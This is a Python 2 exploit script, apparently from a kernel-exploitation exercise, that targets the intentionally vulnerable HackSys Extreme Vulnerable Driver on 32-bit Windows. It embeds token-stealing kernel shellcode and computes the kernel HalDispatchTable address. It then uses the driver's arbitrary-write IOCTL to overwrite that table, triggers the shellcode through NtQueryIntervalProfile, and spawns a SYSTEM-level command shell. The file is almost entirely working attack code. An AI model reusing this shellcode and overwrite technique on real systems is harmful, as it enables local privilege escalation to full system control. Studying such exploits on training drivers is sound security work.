import ctypes, struct, sys, os
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\xC3"                  	# ret
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address


class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 3), # this has an extra c_void_p because the first 4 bytes = number of return entries;
                ("ImageBase", c_void_p), 	# it's not actually part of the structure
                ("ImageSize", c_ulong),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]

######
# 1) Get kernel image name and address in kernel from NtQuerySystemInformation
# 2) Load kernel image name in userland and calculate HalDispatchTable offset
# 3) Calculate HalDispatchTable offset in kernel; return it
######
def get_HDT_kernel_address():	
	# Allocate arbitrary buffer and call NtQuerySystemInformation
	b = create_string_buffer(0)
	systeminformationlength = c_ulong(0)
	res = ntdll.NtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))
	
	# Call NtQuerySystemInformation second time with right size
	b = create_string_buffer(systeminformationlength.value)
	res = ntdll.NtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))
	
	# Marshal raw bytes for 1st entry
	smi = SYSTEM_MODULE_INFORMATION()
	ctypes.memmove(addressof(smi), b, sizeof(smi))
	
	# get kernel image name
	kernelImage = smi.FullPathName.split('\\')[-1]
	print "[+] %s Kernel Base Address: 0x%X" % (kernelImage, smi.ImageBase)
	
	# load kernel image in userland and get HAL Dispatch Table offset
	hKernelImage = kernel32.LoadLibraryA(kernelImage)
	print "[+] Loading %s in Userland" % kernelImage
	print "[+] %s Userland Base Address : 0x%X" % (kernelImage, hKernelImage)
	HDT_user_address = kernel32.GetProcAddress(hKernelImage,"HalDispatchTable")
	print "[+] HalDispatchTable Userland Base Address: 0x%X" % HDT_user_address
	
	# Calculate HAL Dispatch Table offset in kernel land
	HDT_kernel_address = smi.ImageBase + ( HDT_user_address - hKernelImage)
	print "[+] HalDispatchTable Kernel Base Address: 0x%X" % HDT_kernel_address
	
	return HDT_kernel_address
	
	
def trigger_arbitrary_overwrite():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	#  [ -- WHAT (Shellcode pointer) -- ] [ -- WHERE (HDT_kernel_address + 4)-- ]
	write_what = heap_alloc_payload()
	write_where = get_HDT_kernel_address() + 4

	write_what_ptr = c_void_p(write_what)	
	evil_input = struct.pack("<L", addressof(write_what_ptr)) +  struct.pack("<L", write_where)
	evil_input_ptr = id(evil_input) + 20
	evil_size  = len(evil_input)
	print "[+] Writing 0x%X at address 0x%X" % (write_what, write_where)
	kernel32.DeviceIoControl(driver_handle, 0x22200B, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)
	
	print "[+] Calling NtQueryIntervalProfile to trigger vuln"
	arb = c_ulong(0)
	ntdll.NtQueryIntervalProfile(0x1337, byref(arb))
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	

def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Arbitrary Overwrite"
	print "Author: @GradiusX"
	print "\r\n"
	
	
if __name__ == '__main__':
	preamble()
	trigger_arbitrary_overwrite()